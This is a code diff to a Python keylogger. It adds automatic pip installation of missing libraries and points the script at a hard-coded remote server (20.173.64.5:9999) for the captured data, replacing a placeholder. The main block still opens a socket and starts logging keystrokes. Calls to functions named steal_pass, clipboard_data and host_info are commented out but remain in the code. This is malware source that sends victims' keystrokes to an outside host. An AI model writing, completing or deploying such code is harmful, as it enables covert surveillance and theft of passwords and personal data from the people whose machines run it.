@@ -1,4 +1,14 @@
-from pynput.keyboard import Listener, Key, KeyCode
+import importlib.util
+import subprocess
+libs = ['pynput', 'requests', 'psutil', 'win32clipboard']
+for lib in libs:
+    imported = importlib.util.find_spec(lib)
+    if imported is None:
+        try:
+            subprocess.check_call(['pip','install',lib])
+        except subprocess.CalledProcessError:
+            pass
+from pynput.keyboard import Listener, Key, KeyCode  # noqa: E402
 import socket
 import os
 import sqlite3
@@ -131,9 +141,9 @@ class Keylogger:
 
 
 if __name__ == "__main__":
-    ke = Keylogger("your serv ip", "port")
+    ke = Keylogger("20.173.64.5", 9999)
     ke.start_socket()
-    ke.host_info()
-    ke.clipboard_data()
-    ke.steal_pass()
+    # ke.host_info()
+    # ke.clipboard_data()
+    # ke.steal_pass()
     ke.keylogger()
